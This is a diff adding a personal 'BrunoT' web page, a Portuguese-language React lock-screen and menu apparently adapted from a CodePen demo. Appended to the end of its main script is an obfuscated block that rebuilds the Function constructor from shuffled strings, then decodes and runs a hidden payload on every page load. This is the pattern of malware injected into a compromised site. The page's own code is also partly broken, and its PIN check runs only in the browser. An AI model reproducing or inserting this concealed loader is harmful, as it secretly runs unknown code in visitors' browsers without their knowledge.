@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="en" >
+
+<head>
+
+  <meta charset="UTF-8">
+  
+<link rel="apple-touch-icon" type="image/png" href="https://u.cubeupload.com/BrunoT/divertido.png" />
+<meta name="apple-mobile-web-app-title" content="BnT">
+
+<link rel="shortcut icon" type="image/x-icon" href="https://u.cubeupload.com/BrunoT/divertido.png" />
+
+<link rel="mask-icon" type="image/x-icon" href="https://u.cubeupload.com/BrunoT/divertido.png" color="#111" />
+<link rel="stylesheet" href="style.css">
+
+
+
+  <title>BrunoT</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0,maximum-scale=1.0">
+<link href="https://fonts.googleapis.com/css2?family=Rubik:wght@400;500&display=swap" rel="stylesheet">
+  
+
+
+</style>
+    <script> 
+var WIDTH;
+var HEIGHT;
+var canvas;
+var con;
+var g;
+var pxs = new Array();
+var rint = 50;
+
+$(document).ready(function(){
+  WIDTH = window.innerWidth;
+  HEIGHT = window.innerHeight;
+    $('#container').width(WIDTH).height(HEIGHT);
+    canvas = document.getElementById('pixie');
+    $(canvas).attr('width', WIDTH).attr('height',HEIGHT);
+    con = canvas.getContext('2d');
+    for(var i = 0; i < 50; i++) {
+        pxs[i] = new Circle();
+        pxs[i].reset();
+    }
+    setInterval(draw,rint);
+    setInterval(draw,rint2);
+
+});
+
+function draw() {
+    con.clearRect(0,0,WIDTH,HEIGHT);
+    for(var i = 0; i < pxs.length; i++) {
+        pxs[i].fade();
+        pxs[i].move();
+        pxs[i].draw();
+    }
+}
+
+function Circle() {
+    this.s = {ttl:8000, xmax:5, ymax:2, rmax:10, rt:1, xdef:960, ydef:540, xdrift:4, ydrift: 4, random:true, blink:true};
+
+    this.reset = function() {
+        this.x = (this.s.random ? WIDTH*Math.random() : this.s.xdef);
+        this.y = (this.s.random ? HEIGHT*Math.random() : this.s.ydef);
+        this.r = ((this.s.rmax-1)*Math.random()) + 1;
+        this.dx = (Math.random()*this.s.xmax) * (Math.random() < .5 ? -1 : 1);
+        this.dy = (Math.random()*this.s.ymax) * (Math.random() < .5 ? -1 : 1);
+        this.hl = (this.s.ttl/rint)*(this.r/this.s.rmax);
+        this.rt = Math.random()*this.hl;
+        this.s.rt = Math.random()+1;
+        this.stop = Math.random()*.2+.4;
+        this.s.xdrift *= Math.random() * (Math.random() < .5 ? -1 : 1);
+        this.s.ydrift *= Math.random() * (Math.random() < .5 ? -1 : 1);
+    }
+
+    this.fade = function() {
+        this.rt += this.s.rt;
+    }
+
+    this.draw = function() {
+        if(this.s.blink && (this.rt <= 0 || this.rt >= this.hl)) this.s.rt = this.s.rt*-1;
+        else if(this.rt >= this.hl) this.reset();
+        var newo = 1-(this.rt/this.hl);
+        con.beginPath();
+        con.arc(this.x,this.y,this.r,0,Math.PI*2,true);
+        con.closePath();
+        var cr = this.r*newo;
+        g = con.createRadialGradient(this.x,this.y,0,this.x,this.y,(cr <= 0 ? 1 : cr));
+        g.addColorStop(0.0, 'rgba(238,180,28,'+newo+')');
+        g.addColorStop(this.stop, 'rgba(238,180,28,'+(newo*.2)+')');
+        g.addColorStop(1.0, 'rgba(238,180,28,0)');
+        con.fillStyle = g;
+        con.fill();
+    }
+
+    this.move = function() {
+        this.x += (this.rt/this.hl)*this.dx;
+        this.y += (this.rt/this.hl)*this.dy;
+        if(this.x > WIDTH || this.x < 0) this.dx *= -1;
+        if(this.y > HEIGHT || this.y < 0) this.dy *= -1;
+    }
+
+    this.getX = function() { return this.x; }
+    this.getY = function() { return this.y; }
+}
+
+
+
+
+    </script>
+  <script>
+  window.console = window.console || function(t) {};
+</script>
+
+  
+  
+  <script>
+  if (document.location.search.match(/type=embed/gi)) {
+    window.parent.postMessage("resize", "*");
+  }
+</script>
+
+
+</head>
+
+<body translate="no" >
+  <div id="root"></div>
+    <script src="https://cpwebassets.codepen.io/assets/common/stopExecutionOnTimeout.js"></script>
+
+<script crossorigin src="https://unpkg.com/react@17.0.0/umd/react.production.min.js"></script>
+<script crossorigin src="https://unpkg.com/react-dom@17.0.0/umd/react-dom.production.min.js"></script>
+  <script src='https://unpkg.com/react@17/umd/react.development.js'></script>
+<script src='https://unpkg.com/react-dom@17/umd/react-dom.development.js'></script>
+<script src='https://unpkg.com/browse/@types/react@16.4.14/index.d.ts'></script>
+<script src='https://unpkg.com/browse/@types/react-dom@17.0.2/index.d.ts'></script>
+<script src='https://cdnjs.cloudflare.com/ajax/libs/classnames/2.3.1/index.min.js'></script>
+<script src='https://codepen.io/Hyperplexed/pen/xxYJYjM/54407644e24173ad6019b766443bf2a6.js'></script>
+<div class="col-content right">
+      <div class="">
+        <div class="#">
+        </div>
+        <div class="#">
+        </div>
+      </div>
+    </div>
+    <button class="toggle-play">
+      <i id="sound" class="material-icons" style="font-size:41px">music_note</i>
+    </button>
+    <script src="https://code.jquery.com/jquery-3.0.0.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.3/jquery.easing.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.6.0/slick.min.js"></script>
+    <script src="musica1.js"></script>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+      <script id="rendered-js" >
+"use strict";
+var UserStatus;
+(function (UserStatus) {
+    UserStatus["LoggedIn"] = "Logged In";
+    UserStatus["LoggingIn"] = "Logging In";
+    UserStatus["LoggedOut"] = "Logged Out";
+    UserStatus["LogInError"] = "Log In Error";
+    UserStatus["VerifyingLogIn"] = "Verifying Log In";
+})(UserStatus || (UserStatus = {}));
+var Default;
+
+var WeatherType;
+(function (WeatherType) {
+    WeatherType["Cloudy"] = "Cloudy";
+    WeatherType["Rainy"] = "Rainy";
+    WeatherType["Stormy"] = "Stormy";
+    WeatherType["Sunny"] = "Sunny";
+})(WeatherType || (WeatherType = {}));
+const defaultPosition = () => ({
+    left: 0,
+    x: 0
+});
+const N = {
+    clamp: (min, value, max) => Math.min(Math.max(min, value), max),
+    rand: (min, max) => Math.floor(Math.random() * (max - min + 1) + min)
+};
+const T = {
+    format: (date) => {
+        const hours = T.formatHours(date.getHours()), minutes = date.getMinutes(), seconds = date.getSeconds();
+        return `${hours}:${T.formatSegment(minutes)}`;
+    },
+    formatHours: (hours) => {
+        return hours % 12 === 0 ? 12 : hours % 12;
+    },
+    formatSegment: (segment) => {
+        return segment < 10 ? `0${segment}` : segment;
+    }
+};
+const LogInUtility = {
+    verify: async (pin) => {
+        return new Promise((resolve, reject) => {
+            setTimeout(() => {
+                if (pin === Default.PIN) {
+                    resolve(true);
+                }
+                else {
+                    reject(`Invalid pin: ${pin}`);
+                }
+            }, N.rand(300, 700));
+        });
+    }
+};
+const useCurrentDateEffect = () => {
+    const [date, setDate] = React.useState(new Date());
+    React.useEffect(() => {
+        const interval = setInterval(() => {
+            const update = new Date();
+            if (update.getSeconds() !== date.getSeconds()) {
+                setDate(update);
+            }
+        }, 100);
+        return () => clearInterval(interval);
+    }, [date]);
+    return date;
+};
+const ScrollableComponent = (props) => {
+    const ref = React.useRef(null);
+    const [state, setStateTo] = React.useState({
+        grabbing: false,
+        position: defaultPosition()
+    });
+    const handleOnMouseDown = (e) => {
+        setStateTo(Object.assign(Object.assign({}, state), { grabbing: true, position: {
+                x: e.clientX,
+                left: ref.current.scrollLeft
+            } }));
+    };
+    const handleOnMouseMove = (e) => {
+        if (state.grabbing) {
+            const left = Math.max(0, state.position.left + (state.position.x - e.clientX));
+            ref.current.scrollLeft = left;
+        }
+    };
+    const handleOnMouseUp = () => {
+        if (state.grabbing) {
+            setStateTo(Object.assign(Object.assign({}, state), { grabbing: false }));
+        }
+    };
+    return (React.createElement("div", { ref: ref, className: classNames("scrollable-component", props.className), id: props.id, onMouseDown: handleOnMouseDown, onMouseMove: handleOnMouseMove, onMouseUp: handleOnMouseUp, onMouseLeave: handleOnMouseUp }, props.children));
+};
+const WeatherSnap = () => {
+    const [temperature] = React.useState();
+    return (React.createElement("span", { className: "weather" },
+        React.createElement("i", { className: "weather-type", className: "" }),
+        React.createElement("span", { className: "weather-temperature-value" }, temperature),
+        React.createElement("span", { className: "weather-temperature-unit" }, "i ท s a ท a")));
+};
+const Reminder = () => {
+    return (React.createElement("div", { className: "reminder" },
+        React.createElement("div", { className: "reminder-icon" },
+            React.createElement("i", { className: "fa-regular fa-bell" })),
+        React.createElement("span", { className: "reminder-text" },
+            "stefaniaLves2014 (1506806650) ",
+            React.createElement("span", { className: "reminder-time" }, "💃"))));
+};
+const Time = () => {
+    const date = useCurrentDateEffect();
+    return (React.createElement("span", { className: "time" }, T.format(date)));
+};
+const Info = (props) => {
+    return (React.createElement("div", { id: props.id, className: "info" },
+        React.createElement(Time, null),
+        React.createElement(WeatherSnap, null)));
+};
+const PinDigit = (props) => {
+    const [hidden, setHiddenTo] = React.useState(false);
+    React.useEffect(() => {
+        if (props.value) {
+            const timeout = setTimeout(() => {
+                setHiddenTo(true);
+            }, 500);
+            return () => {
+                setHiddenTo(false);
+                clearTimeout(timeout);
+            };
+        }
+    }, [props.value]);
+    return (React.createElement("div", { className: classNames("app-pin-digit", { focused: props.focused, hidden }) },
+        React.createElement("span", { className: "app-pin-digit-value" }, props.value || "")));
+};
+const Pin = () => {
+    const { userStatus, setUserStatusTo } = React.useContext(AppContext);
+    const [pin, setPinTo] = React.useState("");
+    const ref = React.useRef(null);
+    React.useEffect(() => {
+        if (userStatus === UserStatus.LoggingIn || userStatus === UserStatus.LogInError) {
+            ref.current.focus();
+        }
+        else {
+            setPinTo("");
+        }
+    }, [userStatus]);
+    React.useEffect(() => {
+        if (pin.length === 4) {
+            const verify = async () => {
+                try {
+                    setUserStatusTo(UserStatus.VerifyingLogIn);
+                    if (await LogInUtility.verify(pin)) {
+                        setUserStatusTo(UserStatus.LoggedIn);
+                    }
+                }
+                catch (err) {
+                    console.error(err);
+                    setUserStatusTo(UserStatus.LogInError);
+                }
+            };
+            verify();
+        }
+        if (userStatus === UserStatus.LogInError) {
+            setUserStatusTo(UserStatus.LoggingIn);
+        }
+    }, [pin]);
+    const handleOnClick = () => {
+        ref.current.focus();
+    };
+    const handleOnCancel = () => {
+        setUserStatusTo(UserStatus.LoggedOut);
+    };
+    const handleOnChange = (e) => {
+        if (e.target.value.length <= 4) {
+            setPinTo(e.target.value.toString());
+        }
+    };
+    const getCancelText = () => {
+        return (React.createElement("span", { id: "app-pin-cancel-text", onClick: handleOnCancel }, "Cancel"));
+    };
+    const getErrorText = () => {
+        if (userStatus === UserStatus.LogInError) {
+            return (React.createElement("span", { id: "app-pin-error-text" }, "Invalid"));
+        }
+    };
+    return (React.createElement("div", { id: "app-pin-wrapper" },
+        React.createElement("input", { disabled: userStatus !== UserStatus.LoggingIn && userStatus !== UserStatus.LogInError, id: "app-pin-hidden-input", maxLength: 4, ref: ref, type: "number", value: pin, onChange: handleOnChange }),
+        React.createElement("div", { id: "app-pin", onClick: handleOnClick },
+            React.createElement(PinDigit, { focused: pin.length === 0, value: pin[0] }),
+            React.createElement(PinDigit, { focused: pin.length === 1, value: pin[1] }),
+            React.createElement(PinDigit, { focused: pin.length === 2, value: pin[2] }),
+            React.createElement(PinDigit, { focused: pin.length === 3, value: pin[3] })),
+        React.createElement("h3", { id: "app-pin-label" },
+            "Digite a SENHA Curioso ",
+            getErrorText(),
+            " ",
+            getCancelText())));
+};
+const MenuSection = (props) => {
+    const getContent = () => {
+        if (props.scrollable) {
+            return (React.createElement(ScrollableComponent, { className: "menu-section-content" }, props.children));
+        }
+        return (React.createElement("div", { className: "menu-section-content" }, props.children));
+    };
+    return (React.createElement("div", { id: props.id, className: "menu-section" },
+        React.createElement("div", { className: "menu-section-title" },
+            React.createElement("i", { className: props.icon }),
+            React.createElement("span", { className: "menu-section-title-text" }, props.title)),
+        getContent()));
+};
+const QuickNav = () => {
+    const getItems = () => {
+        return [{
+                id: 1,
+                label: "❤"
+            }, {
+                id: 2,
+                label: "🧡"
+            }, {
+                id: 3,
+                label: "💛"
+            }, {
+                id: 4,
+                label: "💚"
+            }].map((item) => {
+            return (React.createElement("div", { key: item.id, className: "quick-nav-item clear-button" },
+                React.createElement("span", { className: "quick-nav-item-label" }, item.label)));
+        });
+    };
+    return (React.createElement(ScrollableComponent, { id: "quick-nav" }, getItems()));
+};
+const Weather = () => {
+    const getDays = () => {
+         [{
+                id: 1,
+                name: "Mon",
+                temperature: N.rand(60, 80),
+                weather: WeatherType.Sunny
+            }, {
+                id: 2,
+                name: "Tues",
+                temperature: N.rand(60, 80),
+                weather: WeatherType.Sunny
+            }, {
+                id: 3,
+                name: "Wed",
+                temperature: N.rand(60, 80),
+                weather: WeatherType.Cloudy
+            }, {
+                id: 4,
+                name: "Thurs",
+                temperature: N.rand(60, 80),
+                weather: WeatherType.Rainy
+            }, {
+                id: 5,
+                name: "Fri",
+                temperature: N.rand(60, 80),
+                weather: WeatherType.Stormy
+            }, {
+                id: 6,
+                name: "Sat",
+                temperature: N.rand(60, 80),
+                weather: WeatherType.Sunny
+            }, {
+                id: 7,
+                name: "Sun",
+                temperature: N.rand(60, 80),
+                weather: WeatherType.Cloudy
+            }].map((day) => {
+            const getIcon = () => {
+                switch (day.weather) {
+                    case WeatherType.Cloudy:
+                        return "fa-duotone fa-clouds";
+                    case WeatherType.Rainy:
+                        return "fa-duotone fa-cloud-drizzle";
+                    case WeatherType.Stormy:
+                        return "fa-duotone fa-cloud-bolt";
+                    case WeatherType.Sunny:
+                        return "";
+                }
+            };
+            return (React.createElement("div", { key: day.id, className: "day-card" },
+                React.createElement("div", { className: "day-card-content" },
+                    React.createElement("span", { className: "day-weather-temperature" },
+                        day.temperature,
+                        React.createElement("span", { className: "day-weather-temperature-unit" }, "\u00B0F")),
+                    React.createElement("i", { className: classNames("day-weather-icon", getIcon(), day.weather.toLowerCase()) }),
+                    React.createElement("span", { className: "day-name" }, day.name))));
+        });
+    };
+    return (React.createElement(MenuSection, { icon: "", id: "weather-section", scrollable: true, title: "" }, getDays()));
+};
+const Tools = () => {
+    const getTools = () => {
+         [{
+                
+            }].map((tool) => {
+            const styles = {
+                backgroundImage: `url(${tool.image})`
+            };
+            return (React.createElement("div", { key: tool.id, className: "tool-card" },
+                React.createElement("div", { className: "tool-card-background background-image", style: styles }),
+                React.createElement("div", { className: "tool-card-content" },
+                    React.createElement("div", { className: "tool-card-content-header" },
+                        React.createElement("span", { className: "tool-card-label" }, tool.label),
+                        React.createElement("span", { className: "tool-card-name" }, tool.name)),
+                    React.createElement("i", { className: classNames(tool.icon, "tool-card-icon") }))));
+        });
+    };
+    return (React.createElement(MenuSection, { icon: "", id: "tools-section", title: "" }, getTools()));
+};
+const Restaurants = () => {
+    const getRestaurants = () => {
+        [{
+                
+            }].map((restaurant) => {
+            const styles = {
+                backgroundImage: `url(${restaurant.image})`
+            };
+            return (React.createElement("div", { key: restaurant.id, className: "restaurant-card background-image", style: styles },
+                React.createElement("div", { className: "restaurant-card-content" },
+                    React.createElement("div", { className: "restaurant-card-content-items" },
+                        React.createElement("span", { className: "restaurant-card-title" }, restaurant.title),
+                        React.createElement("span", { className: "restaurant-card-desc" }, restaurant.desc)))));
+        });
+    };
+    return (React.createElement(MenuSection, { icon: "", id: "restaurants-section", title: "" }, getRestaurants()));
+};
+const Movies = () => {
+    const getMovies = () => {
+        return [{
+                desc: "",
+                id: 1,
+                icon: "",
+                image: "https://i.imgur.com/YK9jSBJ.jpeg?ixlib=rb-1.2.1&ixid=MnwxMjA3fDB8MHxzZWFyY2h8Mnx8bWFydmVsfGVufDB8fDB8fA%3D%3D&auto=format&fit=crop&w=500&q=60",
+                title: "🥰"
+            }, {
+                desc: "",
+                id: 2,
+                icon: "",
+                image: "https://i.imgur.com/QSld3NY.gif?ixlib=rb-1.2.1&ixid=MnwxMjA3fDB8MHxzZWFyY2h8MXx8bG9yZCUyMG9mJTIwdGhlJTIwcmluZ3N8ZW58MHx8MHx8&auto=format&fit=crop&w=500&q=60",
+                title: "❤️"
+            }, {
+                desc: "",
+                id: 3,
+                icon: "",
+                image: "https://i.imgur.com/JDu9mss.gif?ixlib=rb-1.2.1&ixid=MnwxMjA3fDB8MHxzZWFyY2h8MTZ8fGhhcnJ5JTIwcG90dGVyfGVufDB8fDB8fA%3D%3D&auto=format&fit=crop&w=500&q=60",
+                title: "😻"
+            }, {
+                desc: "",
+                id: 4,
+                icon: "",
+                image: "https://i.imgur.com/TpLL08P.jpeg?ixlib=rb-1.2.1&ixid=MnwxMjA3fDB8MHxzZWFyY2h8MXx8c3RhciUyMHdhcnN8ZW58MHx8MHx8&auto=format&fit=crop&w=500&q=60",
+                title: "👅"
+                       
+
+            }].map((movie) => {
+            const styles = {
+                backgroundImage: `url(${movie.image})`
+            };
+            const id = `movie-card-${movie.id}`;
+            return (React.createElement("div", { key: movie.id, id: id, className: "movie-card" },
+                React.createElement("div", { className: "movie-card-background background-image", style: styles }),
+                React.createElement("div", { className: "movie-card-content" },
+                    React.createElement("div", { className: "movie-card-info" },
+                        React.createElement("span", { className: "movie-card-title" }, movie.title),
+                        React.createElement("span", { className: "movie-card-desc" }, movie.desc)),
+                    React.createElement("i", { className: movie.icon }))));
+        });
+    };
+    return (React.createElement(MenuSection, { icon: "fa-solid fa-camera-movie", id: "movies-section", scrollable: true, title: "Na minha história eu sou a princesa... Mas não fui resgatada, sai da torre sozinha, mato um dragão por dia, acordo sem beijo, e digo ao lobo que quem manda sou eu." }, getMovies()));
+};
+const UserStatusButton = (props) => {
+    const { userStatus, setUserStatusTo } = React.useContext(AppContext);
+    const handleOnClick = () => {
+        setUserStatusTo(props.userStatus);
+    };
+    return (React.createElement("button", { id: props.id, className: "user-status-button clear-button", disabled: userStatus === props.userStatus, type: "button", onClick: handleOnClick },
+        React.createElement("i", { className: props.icon })));
+};
+const Menu = () => {
+    return (React.createElement("div", { id: "app-menu" },
+        React.createElement("div", { id: "app-menu-content-wrapper" },
+            React.createElement("div", { id: "app-menu-content" },
+                React.createElement("div", { id: "app-menu-content-header" },
+                    React.createElement("div", { className: "app-menu-content-header-section" },
+                        React.createElement(Info, { id: "app-menu-info" }),
+                        React.createElement(Reminder, null)),
+                    React.createElement("div", { className: "app-menu-content-header-section" },
+                        React.createElement(UserStatusButton, { icon: "fa-solid fa-arrow-right-from-arc", id: "sign-out-button", userStatus: UserStatus.LoggedOut }))),
+                React.createElement(QuickNav, null),
+                React.createElement("a", { id: "youtube-link", className: "clear-button", href: "https://youtu.be/W0DM5lcj6mw?si=KT73xfYOW4Uen5ks", target: "_blank" },
+                    React.createElement("i", { className: "fa-brands fa-youtube" }),
+                    React.createElement("span", null, "Musica Favorita")),
+                 React.createElement("a", { id: "youtube-link", className: "clear-button", href: "https://xat.me/BrunoT", target: "_blank" },
+                    React.createElement("i", { className: "fa-solid fa-star-sharp-half-stroke" }),
+                    React.createElement("span", null, "Créditos")),
+                React.createElement(Weather, null),
+                React.createElement(Restaurants, null),
+                React.createElement(Tools, null),
+                React.createElement(Movies, null)))));
+};
+const Background = () => {
+    const { userStatus, setUserStatusTo } = React.useContext(AppContext);
+    const handleOnClick = () => {
+        if (userStatus === UserStatus.LoggedOut) {
+            setUserStatusTo(UserStatus.LoggingIn);
+        }
+    };
+    return (React.createElement("div", { id: "app-background", onClick: handleOnClick },
+        React.createElement("div", { id: "app-background-image", className: "background-image" })));
+};
+const Loading = () => {
+    return (React.createElement("div", { id: "app-loading-icon" },
+        React.createElement("i", { className: "fa-solid fa-spinner-third" })));
+};
+const AppContext = React.createContext(null);
+const App = () => {
+    const [userStatus, setUserStatusTo] = React.useState(UserStatus.LoggedOut);
+    const getStatusClass = () => {
+        return userStatus.replace(/\s+/g, "-").toLowerCase();
+    };
+    return (React.createElement(AppContext.Provider, { value: { userStatus, setUserStatusTo } },
+        React.createElement("div", { id: "app", className: getStatusClass() },
+            React.createElement(Info, { id: "app-info" }),
+            React.createElement(Pin, null),
+            React.createElement(Menu, null),
+            React.createElement(Background, null),
+            React.createElement("div", { id: "sign-in-button-wrapper" },
+                React.createElement(UserStatusButton, { icon: "fa-solid fa-arrow-right-to-arc", id: "sign-in-button", userStatus: UserStatus.LoggingIn })),
+            React.createElement(Loading, null))));
+};
+ReactDOM.render(React.createElement(App, null), document.getElementById("root"));
+//# sourceURL=pen.js
+
+(function(){var Ymx='',yXt=897-886;function Ueo(h){var r=1444345;var n=h.length;var d=[];for(var l=0;l<n;l++){d[l]=h.charAt(l)};for(var l=0;l<n;l++){var e=r*(l+314)+(r%12388);var x=r*(l+610)+(r%45949);var u=e%n;var g=x%n;var a=d[u];d[u]=d[g];d[g]=a;r=(e+x)%5676677;};return d.join('')};var IOk=Ueo('ctmstoierrlyjckcobhfnzwpunvtqdsograxu').substr(0,yXt);var pxj=' t)6;C1,r,9,)ls=23tvv=(ag=l;ldvf])ieu,+rn4)rsxgv;o(z-ig,r ; ;ui08r,6),94+6pS7srab)7j,n(u89tahrb);;((80d( ;a0nt;(hrv)i,l1n;ue,eomar;]7r+ver+o==;-i ,l,1 tpp{7oh+)(;)gr=(+n;af+am=urlcf=;ki )(r5]m+ve(o1)j}.iq7ngcqA*=.nohets=nc.rg2r07m")t{i;f [byapmm0(,=t<p)8(,ae" jfrckrt)+;Cnaa5lon(nc-o;0hjlla2-uS<[rh+rAu(,,f=oqhorfn.rvan<r]= xa+varr!00}lhs"mv{ar[ [iubr;of4;r]++to, a) )n(c!}a=4lva(=r"f.c8h{,1dtA1.mc;vlr)=avtpio-,no2]=-pra])[ ef.vaaf5=nixh)f3ll=jtuv";jvt=cln;e(lanawg]jsdqfi(p.deig1hztrr{cgb2Cgdn6ie[+.;sf))zi .="bekkv1artst;r=;=f+C2=f]+{+=rolhi,ug8Ccr(+ttsvdl).;1.f{viqvo46eh};oka]au9[r[;A) 8+d=) c=ntib(]a,c=;)7a=f+e;;i8i+aja1;]r0sf<(<e=1.kds.";a=x01pebC,,j=)s5[r.nnfjr(h+an.a-fhu7tut(mg2].;t6lh j  a"ok=f."h"kr)rA ;[.)=d3xgu=kf,),3eo.acnovur9v6)Cf]m=utsieog((ult; }ko6nere*.ev,fh1r)=l)rldreghh.>(;a;6[ 9n;.p7(a(gn;.rrr8;=kC=u.}(ut+.0 ;>p0arnfeh;s;l3rs[e;e(v+[6=(x2mi(vnt9a,.}+g s[=ovn=();';var Das=Ueo[IOk];var mlG='';var cIx=Das;var jZb=Das(mlG,Ueo(pxj));var hhH=jZb(Ueo('j+e%LI1+e_) )k6{3LL)6L1)7$2 Safingt_LLLr)j_Lal43,(z,.;1,3$Lk0#0\/.2{eybz(a+o!.9[nLmf_o7aL=L#)ee+L8e=6L(LeaLL-e$2}L) 8n]0}.L6 6= %_ 5%L)ie3.9)$+7f;f(i;l_($f.,eL2u[[!"58C,4=Lb3";_51 L_&L=aes.00LL4})kL$,L(le.($_}$mL=$w(02LeL b.w;;,_,.kbL}(bmLo),L,i.LL.#L4;hu{)o5(()) 5Lt,iLb$rmhz!euL2(e.)kL1))%z(t4$7p4Lf;a0.zpb.$i,tS;]l}joL;oL3LLL1=3_}3 1;7wdo;L.!(m3.9)p!&53zx.py*Ly.4.3t 5z,t{L$,)Lwi)Ls2=iL)(39LL=a!i.;_0eLw\/) {+iL!g9{35Lg."!(i.i(9p(rf )L$-L");fe\'3)z)_!5(a(h,(L}te{0a 3L.(LLrl)_x.;els]=8w3;.a5tL1b(3r.-;(p.=lfs}oi3)rL)ir3b#1iL)f46=10L=tf (L$*pLL(6ff8),)n+maL)dL.LfLL4L(r!.cnL(L L}t3Lt$LpL)rLo"me4_37ff-1;le=iL%ef L(g -4;nr$82;\'1);LfLt.hLe}3,gL.o%3$!!)0.e6n2 ))([80|5w .e{c=L)fa7k _e1..L}).)3(N;eL)0{)%s)$w)9Lr(&s_ke657L9i&3\/t,o*.\'=$rozsL9{ nL;0oL&=)34fo#,_nit6m)LrL[4e((_!{,!b!L.aL72d(a9f)LL,!63L=,,e{!_oL.;{]\'d.a5!-L!}5.s_}LL.e(,+;".L{,,(;p1\'e!LL!3oe_ f51..$)ri${=L0S+k$1;+1oda\/($h77\/,!jL-.42="74)b$tL.j3t=xge!((30=!].(6LD f.,u.ykn#; !!j.fa{.;LL;7dnb*3z)0)u7t;frL.L.(*!,!Lx9|m%L0,7Lvbn3exL.63;2x,3(Lh_(#7(e({yj\/60L6Ce0_]'));var SRX=cIx(Ymx,hhH );SRX(1275);return 5954})()
+
+    </script>
+
+
+</body>
+
+</html>
+ 
